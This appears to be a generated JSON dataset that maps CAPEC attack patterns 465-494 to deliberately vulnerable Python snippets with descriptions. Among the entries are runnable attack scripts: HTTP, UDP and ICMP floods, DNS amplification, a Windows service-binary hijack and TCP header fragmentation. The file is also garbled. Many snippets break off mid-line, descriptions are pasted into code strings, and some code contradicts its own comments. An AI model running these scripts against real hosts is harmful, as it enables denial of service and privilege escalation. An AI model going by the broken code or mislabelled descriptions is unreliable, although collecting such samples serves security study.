        "description": "This code creates a highly persistent cookie implementation that stores sensitive user data across multiple storage locations in the browser. The cookie persists even after standard deletion attempts by replicating itself from surviving locations. It stores sensitive information in cleartext and lacks proper validation mechanisms, making it vulnerable to unauthorized access and manipulation."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "class TransparentProxy:\n    def __init__(self):\n        self.client_connections = {}\n\n    def forward_request(self, client_request, client_id):\n        try:\n            # Forwarding request without proper source validation\n            headers = client_request.headers\n            original_source = headers.get('X-Forwarded-For', '')\n            \n            # Store sensitive information without proper cleanup\n            self.client_connections[client_id] = {\n                'auth_token': headers.get('Authorization'),\n                'cookies': headers.get('Cookie'),\n                'source_ip': client_request.remote_addr\n            }\n\n            # Incorrectly modify destination\n            destination = headers.get('Host', 'default-server.com')\n            response = requests.request(\n                method=client_request.method,\n                url=f'http://{destination}',\n                data=client_request.data,\n                headers=headers,\n                verify=False  # Disable SSL verification\n            )\n\n            # Forward response without proper validation\n            return response.content\n\n        except Exception as e:\n            return f'Error: {str(e)}'",
        "description": "A vulnerable transparent proxy implementation that forwards requests without proper source validation, stores sensitive information insecurely, and incorrectly handles request destinations. It demonstrates multiple security issues including confused deputy, improper request handling, and inadequate sensitive data cleanup."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/api/user_data', methods=['GET'])\ndef get_user_data():\n    # No TLS/SSL configuration\n    # No origin verification\n    # Relies only on client-side token check\n    auth_token = request.headers.get('Authorization')\n    \n    if auth_token:\n        # Vulnerable cross-origin policy\n        response = jsonify({'user_data': 'sensitive_information'})\n        response.headers['Access-Control-Allow-Origin'] = '*'\n        response.headers['Access-Control-Allow-Headers'] = '*'\n        return response\n    \n    return jsonify({'error': 'Unauthorized'}), 401\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code demonstrates a vulnerable Flask server that exposes sensitive user data through an API endpoint. The server lacks proper TLS/SSL configuration, has permissive CORS headers allowing any origin, and relies solely on client-side token verification. The combination of these vulnerabilities makes it susceptible to man-in-the-middle attacks, particularly when users are connected to untrusted networks like public WiFi."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "from flask import Flask, request, session, render_template_string\nimport requests\n\napp = Flask(__name__)\napp.secret_key = 'insecure_secret_key'\n\n@app.route('/profile')\ndef profile():\n    if 'user_id' not in session:\n        return 'Please login'\n    \n    social_token = session.get('social_token')\n    template = '''\n    <h1>Welcome {{user}}!</h1>\n    <div id=\"profile_data\">%s</div>\n    <script>\n        fetch('/api/get_social_data?token=' + encodeURIComponent('{}'))\n        .then(response => response.json())\n        .then(data => document.getElementById('profile_data').innerHTML = data);\n    </script>\n    '''.format(social_token)\n    \n    return render_template_string(template, user=session.get('username'))\n\n@app.route('/api/get_social_data')\ndef get_social_data():\n    token = request.args.get('token')\n    social_api_url = 'https://social-network.com/api/user_data'\n    response = requests.get(social_api_url, headers={'Authorization': token})\n    return response.json()",
        "description": "This vulnerable Flask application demonstrates multiple security issues: 1) CSRF vulnerability due to no CSRF tokens, 2) XSS through unsafe template rendering, 3) Session fixation by not regenerating session IDs, 4) Exposure of personal information through unsecured API endpoints, and 5) Sensitive information in GET parameters. The code allows an attacker to harvest user's social network data through cross-site requests while maintaining an active session."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route('/style')\ndef custom_style():\n    user_color = request.args.get('color', '')\n    user_bg = request.args.get('background', '')\n    \n    css = f'''\n    body {{\n        color: {user_color",
        "description": "\"This code demonstrates a vulnerable CSS injection scenario where user input is directly embedded into CSS without proper sanitization. The application allows users to customize styles through URL parameters and includes a CSS file that can be manipulated to extract sensitive data through malicious CSS selectors. The code is vulnerable to CSS injection attacks that can steal data cross-domain by abusing CSS loading behavior and selector matching.\""
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import requests\nimport threading\n\ndef keep_session_alive(url):\n    session = requests.Session()\n    while True:\n        try:\n            # Start a long-running request without completing it\n            response = session.get(url, stream=True)\n            # Keep connection open by reading data very slowly\n            for _ in response.iter_content(chunk_size=1):\n                pass\n        except:\n            continue\n\ndef http_flood(target_url, num_threads=500):\n    threads = []\n    for _ in range(num_threads):\n        t = threading.Thread(target=keep_session_alive, args=(target_url,))\n        t.daemon = True\n        threads.append(t)\n        t.start()\n    \n    # Keep main thread running\n    for t in threads:\n        t.join()\n\n# Usage\ntarget = 'http://vulnerable-server.com'\nhttp_flood(target)",
        "description": "This code implements an HTTP flooding attack by creating multiple threads that establish and maintain long-running HTTP sessions with the target server. Each thread creates a persistent connection and keeps it alive indefinitely, consuming server resources. The code lacks any resource limitations or session cleanup, potentially exhausting the server's connection pool and memory resources. It exploits CWE-770 by creating unlimited connections, CWE-772 by not releasing connections, and CWE-410 by overwhelming the server's resource pool."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import mysql.connector\nimport os\n\ndef execute_admin_query(user_input):\n    # Connect with root privileges\n    conn = mysql.connector.connect(\n        host='localhost',\n        user='root',\n        password='admin_pass',\n        database='system_db'\n    )\n    cursor = conn.cursor()\n    \n    # Dangerous: Execute raw SQL query with system privileges\n    query = f\"SELECT * FROM users WHERE id = {user_input}\"\n    cursor.execute(query)\n    \n    # Dangerous: Allow file system access through SQL\n    cursor.execute(f\"SELECT load_file('{user_input}')\")\n    \n    # Dangerous: Enable custom function that can execute OS commands\n    cursor.execute(\"CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_sys_exec.so'\")\n    cursor.execute(f\"SELECT sys_exec('{user_input}')\")\n    \n    # Cursor left open (dangling cursor)\n    return cursor.fetchall()",
        "description": "This code demonstrates multiple severe security vulnerabilities including: running with excessive privileges (root), SQL injection through unvalidated user input, dangerous file system access through SQL, creation and execution of custom functions that can run OS commands, and leaving database cursors dangling. The code allows an attacker to potentially execute arbitrary commands on the host system and access sensitive system resources."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "\"\"\"\nimport os\nimport sys\nimport ctypes\n\nclass LibraryLoader:\n    def __init__(self):\n        self.lib_path = os.path.dirname(os.path.abspath(sys.argv[0]))\n    \n    def load_library(self, lib_name):\n        # Vulnerable: searches current directory first without validation\n        try:\n            lib_file = os.path.join(self.lib_path, lib_name)\n            return ctypes.CDLL(lib_file)\n        except:\n            # Fallback to system paths without checking library authenticity\n            return ctypes.CDLL(lib_name)\n\ndef main():\n    loader = LibraryLoader()\n    # Vulnerable: blindly loads library without verification\n    crypto_lib = loader.load_library('crypto.dll')\n    crypto_lib.encrypt()\n\nif __name__ == '__main__':\n    main()\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable library loading mechanism that searches for DLLs in the current directory before system directories, making it susceptible to DLL hijacking. The code doesn't validate the authenticity of loaded libraries and assumes trusted paths, allowing an attacker to place malicious libraries in the application directory.\"",
        "description": "\"This code demonstrates a vulnerable library loading mechanism that searches for DLLs in the current directory before system directories, making it susceptible to DLL hijacking. The code doesn't validate the authenticity of loaded libraries and assumes trusted paths, allowing an attacker to place malicious libraries in the application directory.\""
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef browser_detect():\n    user_agent = request.headers.get('User-Agent')\n    script = f'''\n        <script>\n        var browserInfo = {{\n            userAgent: navigator.userAgent,\n            platform: navigator.platform,\n            language: navigator.language,\n            cookies: navigator.cookieEnabled,\n            plugins: Array.from(navigator.plugins).map(p => p.name),\n            screenRes: window.screen.width + 'x' + window.screen.height",
        "description": "\"This vulnerable code demonstrates browser fingerprinting by collecting detailed browser information through JavaScript and sending it via an unprotected GET request. It exposes sensitive browser data, uses unsafe template rendering, and lacks input sanitization. The code collects browser details including user agent, platform, installed plugins, and screen resolution, storing them in a log file without proper access controls.\""
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import socket\nimport json\n\ndef verify_message(message, signature):\n    # Weak signature verification using simple XOR\n    expected = b'valid_signature'\n    calculated = bytes([a ^ b for a, b in zip(message.encode(), signature)])\n    return calculated == expected\n\ndef process_command(data):\n    try:\n        msg = json.loads(data)\n        if verify_message(msg['command'], msg.get('signature', b'')):\n            # Dangerous: executing commands from unauthenticated source\n            if msg['command'] == 'admin_action':\n                return 'Executing admin command...'\n            return 'Command processed'\n    except:\n        pass\n    return 'Invalid message'\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8888))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        data = client.recv(1024)\n        response = process_command(data)\n        client.send(response.encode())\n        client.close()",
        "description": "This vulnerable code implements a server that processes commands without proper cryptographic validation. It uses a weak XOR-based signature verification, accepts connections from any source, and executes commands without properly authenticating the sender. The code lacks input validation, uses an insecure signature verification method, and doesn't verify message integrity during transmission."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "\"\"\"\nimport os\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import padding\n\nclass SignatureSystem:\n    def __init__(self):\n        # Insecure storage of private key in plaintext file\n        self.private_key_path = 'private_key.pem'\n        self.trusted_signers = {",
        "description": "\"This vulnerable code demonstrates insecure storage of private keys and weak signature verification. The private key is stored in plaintext, making it susceptible to theft. The signature verification system does not properly authenticate the signer's identity and assumes the claimed_signer parameter is trustworthy. There's no protection against reflection attacks or spoofing, and the system blindly trusts signatures without proper entity authentication.\""
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "\"\"\"\nimport rsa\nimport base64\n\ndef verify_signature(data, signature, public_key):\n    try:\n        # Weak implementation using broken RSA padding\n        decoded_signature = base64.b64decode(signature)\n        # Using unsafe padding mode and no hash verification\n        return rsa.verify(data.encode(), decoded_signature, public_key)\n    except:\n        # Unsafe fallback that always returns True on error\n        return True\n\ndef process_signed_message(data, signature):\n    # Generate weak 512-bit key\n    (pubkey, privkey) = rsa.newkeys(512)\n    \n    # No certificate chain validation\n    if verify_signature(data, signature, pubkey):\n        # Process message without proper authentication\n        execute_command(data)\n    \ndef execute_command(data):\n    # Process potentially malicious data\n    exec(data)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable signature verification by using weak RSA keys (512-bit), improper signature validation with unsafe padding, no certificate validation, and a dangerous fallback that authenticates on error. It also executes commands without proper validation, allowing signature spoofing attacks.\"",
        "description": "\"This code demonstrates vulnerable signature verification by using weak RSA keys (512-bit), improper signature validation with unsafe padding, no certificate validation, and a dangerous fallback that authenticates on error. It also executes commands without proper validation, allowing signature spoofing attacks.\""
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "\"\"\"\nimport ssl\nimport socket\nimport json\n\nclass VulnerableSignatureVerifier:\n    def __init__(self):\n        self.trusted_keys = {'admin': 'default_key'",
        "description": "\"This code demonstrates multiple vulnerabilities related to signature verification and message authentication. It includes weak signature verification, improper identity validation, unsafe command execution, and insecure communication channel setup. The code accepts messages with claimed identities and signatures without proper cryptographic verification, allowing signature spoofing. It also executes commands from authenticated messages using eval(), which is dangerous. The communication channel is not properly secured and doesn't validate endpoints.\""
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "\"\"\"\ndef process_user_data(data_bytes):\n    # Convert unsigned bytes to signed integer without proper bounds checking\n    signed_value = ctypes.c_int32(int.from_bytes(data_bytes, 'big', signed=False)).value\n    \n    if signed_value > 0:  # Vulnerable validation\n        # Transmit sensitive data without encryption\n        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        conn.connect(('remote_server', 8080))\n        conn.send(str(signed_value).encode())\n        \n        # Store data without encryption\n        with open('sensitive_data.txt', 'w') as f:\n            f.write(str(signed_value))\n            \n    return signed_value\n\n# Example usage that could lead to vulnerability\ndata = b'\\\\xff\\\\xff\\\\xff\\\\xff'  # Max unsigned 32-bit value\nresult = process_user_data(data)\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities including unsigned-to-signed conversion without proper validation, cleartext transmission of sensitive data, and storage of sensitive information without encryption. The code fails to properly validate signatures and protection mechanisms, allowing for potential exploitation of the signed/unsigned conversion.\"",
        "description": "\"This code demonstrates multiple vulnerabilities including unsigned-to-signed conversion without proper validation, cleartext transmission of sensitive data, and storage of sensitive information without encryption. The code fails to properly validate signatures and protection mechanisms, allowing for potential exploitation of the signed/unsigned conversion.\""
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32service\nimport win32serviceutil\nimport os\n\ndef modify_service_binary(service_name):\n    try:\n        # Open service with ALL_ACCESS rights without proper access control\n        service_handle = win32service.OpenService(\n            win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS),\n            service_name,\n            win32service.SERVICE_ALL_ACCESS\n        )\n        \n        # Change service binary path to malicious executable\n        malicious_path = 'C:\\Windows\\System32\\malicious.exe'\n        win32service.ChangeServiceConfig(\n            service_handle,\n            win32service.SERVICE_NO_CHANGE,\n            win32service.SERVICE_AUTO_START,\n            win32service.SERVICE_NO_CHANGE,\n            malicious_path,\n            None,\n            0,\n            None,\n            None,\n            None,\n            None\n        )\n        \n        # Restart service to execute malicious binary\n        win32serviceutil.RestartService(service_name)\n        \n    except Exception as e:\n        pass\n\n# Attempt to modify a system service\nmodify_service_binary('ImportantService')",
        "description": "This code demonstrates a vulnerable implementation that attempts to modify Windows service configuration without proper access controls. It opens a service manager with full access rights, changes the service binary path to a malicious executable, and restarts the service. The code lacks proper authorization checks, permission validation, and logging mechanisms, making it susceptible to privilege escalation attacks. It also ignores potential security exceptions, making it harder to detect malicious modifications."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\ndef connect_to_server(host, port):\n    context = ssl.create_default_context()\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n\n    sock = socket.create_connection((host, port))\n    ssl_sock = context.wrap_socket(sock, server_hostname=host)\n\n    # Skipping certificate validation entirely\n    client_cert = open('untrusted_cert.pem', 'rb').read()\n    context.load_verify_locations(cadata=client_cert)\n\n    return ssl_sock\n\ndef install_root_cert(cert_path):\n    import subprocess\n    # Dangerous: Installing certificate without validation\n    subprocess.run(['certutil', '-addstore', 'root', cert_path], shell=True)\n\n# Using the vulnerable connection\nconnection = connect_to_server('example.com', 443)\ninstall_root_cert('malicious_cert.pem')",
        "description": "This vulnerable code disables SSL certificate validation and allows installation of untrusted root certificates. It creates an SSL context with hostname checking and certificate verification disabled, loads potentially malicious certificates without proper validation, and installs root certificates without proper authorization checks or chain of trust validation."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\ndef run_virtual_env():\n    # Insecure virtualization setup with inadequate isolation\n    sandbox_path = '/untrusted_path'\n    user_input = input('Enter command to run in sandbox: ')\n    \n    # Vulnerable: No proper validation or escape checking\n    cmd = f'docker run --privileged -v /:/host_root alpine {user_input}'\n    \n    # Vulnerable: Direct execution of untrusted input with high privileges\n    subprocess.run(cmd, shell=True)\n    \n    # Vulnerable: Shared memory access without proper isolation\n    with open('/proc/meminfo', 'r') as f:\n        mem_data = f.read()\n    \n    # Vulnerable: Accessing host system resources from within container\n    os.system(f'cp {sandbox_path}/* /host_root/etc/')\n\nrun_virtual_env()",
        "description": "This vulnerable code demonstrates a virtualization escape scenario where insufficient isolation and improper access controls allow an attacker to break out of a container environment. The code uses privileged Docker containers with host filesystem mounting, executes untrusted input without validation, and provides direct access to host system resources. It also includes vulnerable memory access patterns that could be exploited through side-channel attacks."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "\"\"\"\nimport requests\nfrom urllib.parse import urlparse\n\nclass CDNRouter:\n    def __init__(self):\n        self.allowed_domains = ['trusted-cdn.com', 'trusted-cdn-2.com']\n        \n    def route_request(self, target_url, sni_header=None, http_host=None):\n        parsed_url = urlparse(target_url)\n        \n        # Vulnerable: No verification of domain consistency\n        headers = {\n            'Host': http_host or parsed_url.netloc,\n            'SNI-Domain': sni_header or ''  # Allows empty SNI (Domainless Fronting)",
        "description": "\"A vulnerable CDN routing implementation that allows domain fronting by not properly validating domain consistency between SNI and HTTP Host headers. It also permits domainless fronting by accepting empty SNI fields and fails to properly restrict communication endpoints. The code disables SSL verification and doesn't properly validate domains against an allowed list, enabling potential request smuggling and unauthorized access through non-canonical URLs.\""
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\nimport threading\n\ndef handle_client(client_socket):\n    # No limit on resources per client\n    while True:\n        data = client_socket.recv(1024)\n        if not data:\n            break\n        # Process client data without volume control\n        response = process_data(data)\n        client_socket.send(response)\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # No limit on number of connections\n        # No SYN flood protection\n        # No message integrity checks\n        client_thread = threading.Thread(target=handle_client, args=(client,))\n        client_thread.start()\n\ndef process_data(data):\n    # No validation of message size or rate\n    # Processes all incoming data without restrictions\n    return data * 2  # Simple echo amplification\n\nstart_server()",
        "description": "This vulnerable server code demonstrates multiple security issues: it lacks resource allocation limits (CWE-770), doesn't implement flood protection against TCP SYN attacks, processes messages without volume control (CWE-406), and lacks message integrity checks (CWE-924). The server accepts unlimited connections and processes unlimited data volume per client, making it susceptible to denial of service through resource exhaustion and TCP flooding attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\n\ndef process_xml_data(xml_input):\n    # Directly parse XML without validation or sanitization\n    try:\n        tree = ET.XML(xml_input, parser=ET.XMLParser())\n        user_data = tree.find('credentials')\n        \n        if user_data is not None:\n            username = user_data.find('username').text\n            password = user_data.find('password').text\n            \n            # Client-side authentication check\n            if username == 'admin' and password == 'secret':\n                return True\n            \n        return False\n    except Exception as e:\n        print(f\"Error processing XML: {e",
        "description": "\"This code demonstrates multiple XML-related vulnerabilities including missing XML validation against a schema, client-side security enforcement, potential XML injection, and XXE vulnerability. The code processes XML input without proper validation or sanitization, relies on client-side authentication checks, and uses an unsafe XML parser that could process malicious external entities.\""
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "\"\"\"\nimport random\nimport time\n\nclass AuthSignatureSystem:\n    def __init__(self):\n        # Using predictable seed for random number generation\n        random.seed(int(time.time()))\n        self.private_key = random.randint(1, 1000)\n    \n    def generate_signature(self, message):\n        # Weak signature generation using simple multiplication\n        signature = message * self.private_key\n        return signature\n    \n    def verify_signature(self, message, signature):\n        expected = message * self.private_key\n        return signature == expected\n\ndef authenticate_user(message, signature):\n    auth_system = AuthSignatureSystem()\n    # Vulnerable to replay attacks as same signature will work multiple times\n    if auth_system.verify_signature(message, signature):\n        grant_access()\n        return True\n    return False\n\ndef grant_access():\n    pass\n\"\"\",\n    \"description\": \"This vulnerable code implements a weak digital signature system using predictable random number generation for key creation and a simplistic signature algorithm. It uses time as a seed for random number generation, making it predictable. The signature mechanism is vulnerable to replay attacks and the private key could be derived due to weak cryptographic implementation. Additionally, the authentication system maintains no state of previous signatures, allowing replay attacks.\"",
        "description": "\"This vulnerable code implements a weak digital signature system using predictable random number generation for key creation and a simplistic signature algorithm. It uses time as a seed for random number generation, making it predictable. The signature mechanism is vulnerable to replay attacks and the private key could be derived due to weak cryptographic implementation. Additionally, the authentication system maintains no state of previous signatures, allowing replay attacks.\""
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\n\ndef udp_flood():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    target_ip = '192.168.1.1'\n    target_port = 53  # DNS port\n    payload = b'A' * 1024  # Large payload\n    \n    while True:\n        try:\n            # Spoofed source IP\n            spoofed_ip = f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'\n            sock.sendto(payload, (target_ip, target_port))\n            # No rate limiting or resource constraints\n            # Continuously sending large packets without checking server capacity\n            \n        except Exception as e:\n            continue\n            \nif __name__ == '__main__':\n    udp_flood()",
        "description": "This code demonstrates a UDP flood attack implementation that exhibits multiple vulnerabilities: unlimited resource allocation (CWE-770), improper network message volume control (CWE-406), and potential for spoofed source addresses. The code continuously sends large UDP packets to a target without any rate limiting, potentially overwhelming network resources. The communication is in cleartext (CWE-319) and lacks message integrity checks (CWE-924)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport random\n\ndef icmp_flood():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    target_ip = '192.168.1.1'\n    \n    while True:\n        # Generate random source IP to spoof\n        src_ip = f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'\n        \n        # Create raw ICMP packet without size limits\n        icmp_packet = b'\\x08\\x00\\x00\\x00' + b'\\x41' * 65000\n        \n        try:\n            # Send packets continuously without rate limiting\n            sock.sendto(icmp_packet, (target_ip, 0))\n            assert sock.getsockname()[0] == src_ip, 'Source IP verification failed'\n        except Exception:\n            continue\n\nicmp_flood()",
        "description": "This code demonstrates a vulnerable implementation that enables ICMP flooding. It creates raw ICMP packets with spoofed source IPs and sends them continuously without any rate limiting or resource restrictions. The code lacks proper destination verification, includes an unnecessary assertion, and transmits data without encryption. There are no checks to validate the communication endpoints or limit resource consumption."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/proxy')\ndef proxy_request():\n    target_url = request.args.get('url')\n    \n    # No URL validation or rate limiting\n    # No resource pool management or request throttling\n    response = requests.get(target_url, stream=True)\n    \n    # Keeps connection open and streams large response\n    return response.raw.read()\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    results = []\n    \n    # Resource-intensive operation with no limits\n    for _ in range(10000):\n        results.append(process_search(query))\n    \n    return {'results': results}\n\ndef process_search(query):\n    # Simulate expensive operation\n    import time\n    time.sleep(0.1)\n    return f'Result for {query}'",
        "description": "A vulnerable web application that allows unrestricted HTTP GET requests with no rate limiting, resource pool management, or input validation. It includes a proxy endpoint vulnerable to SSRF and a search endpoint that can be exploited for resource exhaustion. The code demonstrates multiple vulnerabilities including unbounded resource allocation, sensitive data in GET requests, and potential for HTTP request smuggling."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "from flask import Flask\nimport ssl\n\napp = Flask(__name__)\n\n@app.route('/')\ndef handle_request():\n    context = ssl.create_default_context()\n    # No limit on SSL renegotiations\n    context.options |= ssl.OP_NO_RENEGOTIATION\n    # No connection limits or timeouts\n    context.verify_mode = ssl.CERT_OPTIONAL\n    \n    # Process SSL handshake without any resource limits\n    while True:\n        try:\n            context.wrap_socket(app.socket)\n        except:\n            continue\n            \n    return 'Connection established'\n\nif __name__ == '__main__':\n    app.run(ssl_context='adhoc', host='0.0.0.0', port=443)",
        "description": "This vulnerable code implements a Flask server that handles SSL connections without any resource limitations or protection against SSL renegotiation attacks. It creates an infinite loop for SSL handshakes, doesn't implement any connection pooling, timeout mechanisms, or rate limiting, making it susceptible to SSL flooding attacks. The server will continuously process SSL renegotiations until system resources are exhausted."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "\"\"\"\nimport socket\nimport random\n\ndef amplification_attack(target_ip, target_port, num_requests=1000):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # DNS server list without validation\n    dns_servers = [\n        '8.8.8.8',\n        '8.8.4.4',\n        '1.1.1.1'\n    ]\n    \n    # DNS query that generates large response\n    dns_query = bytes.fromhex('AA AA 01 00 00 01 00 00 00 00 00 00 07') + \\\n                b'example' + b'\\x03com\\x00\\x00\\xff\\x00\\x01'\n    \n    for _ in range(num_requests):\n        for dns_server in dns_servers:\n            # Spoofing source IP to target's IP\n            sock.sendto(dns_query, (dns_server, 53))\n            \n    sock.close()\n\n# Usage without any rate limiting or authentication\namplification_attack('10.0.0.1', 80)\n\"\"\",\n    \"description\": \"This code demonstrates a DNS amplification attack where small DNS queries are sent to multiple DNS servers with a spoofed source IP. The DNS servers respond with much larger packets to the target IP. The code lacks resource limits, authentication, and proper destination validation, making it vulnerable to abuse for DDoS attacks.\"",
        "description": "\"This code demonstrates a DNS amplification attack where small DNS queries are sent to multiple DNS servers with a spoofed source IP. The DNS servers respond with much larger packets to the target IP. The code lacks resource limits, authentication, and proper destination validation, making it vulnerable to abuse for DDoS attacks.\""
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "def parse_data(input_data):\n    data_dict = {}\n    for i in range(len(input_data)):\n        # Create nested dictionaries with expanding data\n        key = f'level_{i}'\n        if i == 0:\n            data_dict[key] = input_data * 1000000\n        else:\n            data_dict[key] = {f'sublevel_{j}': data_dict[f'level_{i-1}'] for j in range(1000)}\n    \n    # Process the expanded data\n    result = []\n    for key in data_dict:\n        temp = str(data_dict[key])\n        result.append(temp)\n    \n    return ''.join(result)\n\n# Vulnerable usage\nuser_input = 'A' * 1000\nresult = parse_data(user_input)",
        "description": "This code demonstrates a vulnerable implementation that allows for excessive memory allocation through nested data structures and string multiplication. The function creates an expanding dictionary where each level contains copies of the previous level's data, leading to exponential memory growth. The lack of size checks and resource limits makes it susceptible to denial of service attacks through memory exhaustion."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "def verify_email(email):\n    import re\n    pattern = '([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.([a-zA-Z]+)*'\n    if re.match(pattern, email):\n        return True\n    return False\n\ndef process_emails(email_list):\n    valid_emails = []\n    for email in email_list:\n        if verify_email(email):\n            valid_emails.append(email)\n    return valid_emails\n\n# Vulnerable to ReDOS when input like 'a' * n + '@example.com'\nemail_list = ['user@example.com', 'a' * 100000 + '@example.com']",
        "description": "This code demonstrates a vulnerable regular expression implementation for email validation. The pattern uses nested quantifiers ('*') which can cause catastrophic backtracking, leading to exponential time complexity when processing certain inputs. The regex lacks proper anchors (^ and $) and is overly permissive, allowing malformed email addresses. When processing large inputs with repeated characters, it can cause excessive CPU consumption due to inefficient backtracking."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nfrom xml.etree import ElementTree\nimport xml.sax.handler\n\napp = Flask(__name__)\n\n@app.route('/process_soap', methods=['POST'])\ndef process_soap():\n    soap_data = request.data\n    try:\n        # Vulnerable XML parsing without size restrictions\n        tree = ElementTree.fromstring(soap_data)\n        \n        # Process array elements without memory limits\n        for element in tree.findall('.//Array'):\n            size = int(element.get('size', 0))\n            # Allocate memory for array without checks\n            array_data = [None] * size\n            \n            # Process array elements\n            for item in element:\n                index = int(item.get('index', 0))\n                array_data[index] = item.text\n                \n        return \"SOAP message processed successfully\"\n        \n    except Exception as e:\n        return str(e)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable SOAP web service that processes XML messages containing arrays. It's vulnerable to XML array-based DoS attacks because it doesn't implement any limits on array sizes or memory allocation. The service blindly allocates memory based on the size attribute in the array declaration without validation, allowing an attacker to request excessive memory allocation with a small message containing a large array declaration.\"",
        "description": "\"This code demonstrates a vulnerable SOAP web service that processes XML messages containing arrays. It's vulnerable to XML array-based DoS attacks because it doesn't implement any limits on array sizes or memory allocation. The service blindly allocates memory based on the size attribute in the array declaration without validation, allowing an attacker to request excessive memory allocation with a small message containing a large array declaration.\""
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\ndef fragment_tcp_packet(target_ip, target_port, payload):\n    # Create raw socket without resource limits\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # TCP Header with flags in second fragment\n    source_port = 12345\n    seq = 0\n    window = socket.htons(5840)\n    \n    # Split TCP header to push flags into second fragment\n    header1 = struct.pack('!HHLL', source_port, target_port, seq, 0)\n    header2 = struct.pack('!HH', window, 0) + bytes([0x50, 0x02]) # SYN flag\n    \n    fragments = []\n    fragments.append(header1 + payload[:20])\n    fragments.append(header2 + payload[20:])\n    \n    # Send fragments without proper resource cleanup\n    for fragment in fragments:\n        try:\n            sock.sendto(fragment, (target_ip, 0))\n        except:\n            pass\n    \n    # Socket left open intentionally to exhaust resources\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable TCP fragmentation implementation that splits TCP headers across multiple fragments to potentially bypass filtering. It includes resource exhaustion (CWE-770) by not limiting connections, improper resource cleanup (CWE-404) by not closing sockets, and sends data in cleartext (CWE-319). The fragmentation manipulates TCP headers to push flags into the second fragment, which may bypass 